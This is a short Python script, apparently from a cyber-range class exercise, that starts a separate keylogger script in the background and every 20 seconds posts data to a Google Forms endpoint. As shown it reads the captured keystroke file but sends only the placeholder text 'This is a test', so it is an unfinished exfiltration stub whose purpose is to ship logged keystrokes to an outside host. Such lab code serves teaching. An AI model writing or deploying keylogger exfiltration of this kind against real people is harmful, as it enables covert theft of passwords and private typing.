#!/usr/bin/env python3

import requests
import time
import os
from pynput.keyboard import Listener

startlog = time.time()

os.system('python3 /home/kali/ITP270_FALL2022/Python_Scripting_Cyber_Range/Keylogger_Remote_Form/keyloggerRemoteTest.py &')
time.sleep(1)

def send_request():
	form_input = open("/home/kali/ITP270_FALL2022/Python_Scripting_Cyber_Range/Keylogger_Remote_Form/keyboard_Input.txt")
	form_send = form_input.read()
	url = 'https://docs.google.com/forms/u/1/d/e/1FAIpQLSf9WQu4b2ZbgLPFHusSGuI-2W3LE3FfSPHqxxMdqqYXTg3r8w/formResponse'
	form_data = {'entry.839337160':'This is a test'}
	r=requests.post(url, data=form_data)

def interval():
	global startlog
	if time.time() - 20 > startlog:
		print("it's been 20 secs")
		send_request()
		startlog = time.time()

counter = 0
while True:
	counter += 1
	print(counter)
	interval()
	time.sleep(1)
